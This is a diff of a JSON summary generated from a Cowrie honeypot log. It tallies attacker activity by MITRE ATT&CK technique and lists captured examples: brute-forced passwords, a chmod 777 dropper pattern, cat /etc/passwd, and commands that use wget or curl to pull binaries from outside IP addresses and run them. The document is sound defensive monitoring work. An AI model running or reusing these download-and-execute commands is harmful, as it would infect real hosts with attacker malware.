@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-04 09:01:56",
+  "generated": "2026-09-04 10:04:20",
   "totals": {
-    "commands": 91,
-    "login_failed": 692,
-    "login_success": 51,
-    "sessions": 877
+    "commands": 155,
+    "login_failed": 797,
+    "login_success": 57,
+    "sessions": 927
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 692,
+      "count": 797,
       "examples": [
         "root / abcd12345",
         "admin / yess",
@@ -21,14 +21,14 @@
         "root / Arian"
       ],
       "first": "2026-09-04T00:00:06.722859Z",
-      "last": "2026-09-04T08:55:53.706590Z",
-      "unique_ips": 113
+      "last": "2026-09-04T10:03:10.482298Z",
+      "unique_ips": 125
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 51,
+      "count": 57,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "support / letmein",
@@ -37,14 +37,14 @@
         "root / "
       ],
       "first": "2026-09-04T00:10:27.211479Z",
-      "last": "2026-09-04T08:49:06.888760Z",
-      "unique_ips": 44
+      "last": "2026-09-04T09:54:49.401959Z",
+      "unique_ips": 48
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 32,
+      "count": 35,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -53,14 +53,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-09-04T00:25:16.590506Z",
-      "last": "2026-09-04T08:36:34.500676Z",
-      "unique_ips": 4
+      "last": "2026-09-04T09:54:50.769367Z",
+      "unique_ips": 6
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 9,
+      "count": 10,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -69,8 +69,8 @@
         "nohup $SHELL -c \"curl http://120.26.66.176:8796/linux -o /tmp/jyv7FUoQeO; if [ ! -f /tmp/jyv7FUoQeO ]; then wget http://"
       ],
       "first": "2026-09-04T00:25:18.578399Z",
-      "last": "2026-09-04T05:50:38.884319Z",
-      "unique_ips": 3
+      "last": "2026-09-04T09:54:50.769367Z",
+      "unique_ips": 4
     },
     {
       "id": "T1082",
@@ -91,14 +91,15 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 3,
+      "count": 4,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "id"
       ],
       "first": "2026-09-04T00:25:18.578399Z",
-      "last": "2026-09-04T08:36:34.500676Z",
-      "unique_ips": 3
+      "last": "2026-09-04T09:54:49.991784Z",
+      "unique_ips": 4
     },
     {
       "id": "T1059.004",
@@ -126,6 +127,18 @@
       "unique_ips": 1
     },
     {
+      "id": "T1087.001",
+      "name": "Account Discovery: Local Account",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "cat /etc/passwd"
+      ],
+      "first": "2026-09-04T09:54:49.996347Z",
+      "last": "2026-09-04T09:54:49.996347Z",
+      "unique_ips": 1
+    },
+    {
       "id": "T1095",
       "name": "Non-Application Layer Protocol",
       "tactic": "Command and Control",
@@ -140,6 +153,18 @@
   ],
   "unmapped": [
     [
+      "system",
+      10
+    ],
+    [
+      "shell",
+      10
+    ],
+    [
+      "sh",
+      10
+    ],
+    [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
       8
     ],
@@ -148,28 +173,16 @@
       7
     ],
     [
-      "system",
-      6
-    ],
-    [
-      "shell",
-      6
-    ],
-    [
-      "sh",
-      6
-    ],
-    [
       "/bin/busybox UNSTABLE",
-      4
+      5
     ],
     [
       "enable",
-      2
+      5
     ],
     [
       "linuxshell",
-      2
+      4
     ],
     [
       "enablelinuxshell",
@@ -184,28 +197,40 @@
       2
     ],
     [
-      "busybox",
-      1
+      ">/tmp/.codi && cd /tmp/",
+      2
     ],
     [
-      "echo 1 > /dev/null && cat /bin/echo",
-      1
+      ">/var/.codi && cd /var/",
+      2
     ],
     [
-      "head -c 3716336 > /tmp/e2rAtcLCUx",
-      1
+      ">/dev/.codi && cd /dev/",
+      2
     ],
     [
-      "echo 1 > /dev/null && cat /bin/echoQtd#0000",
-      1
+      ">/mnt/.codi && cd /mnt/",
+      2
     ],
     [
-      ">A@/`'8",
-      1
+      ">/var/run/.codi && cd /var/run/",
+      2
     ],
     [
-      "User-Agent: Mozilla/5.0 zgrab/0.x",
-      1
+      ">/var/tmp/.codi && cd /var/tmp/",
+      2
+    ],
+    [
+      ">/.codi && cd /",
+      2
+    ],
+    [
+      ">/dev/netslink/.codi && cd /dev/netslink/",
+      2
+    ],
+    [
+      ">/dev/shm/.codi && cd /dev/shm/",
+      2
     ]
   ]
 }
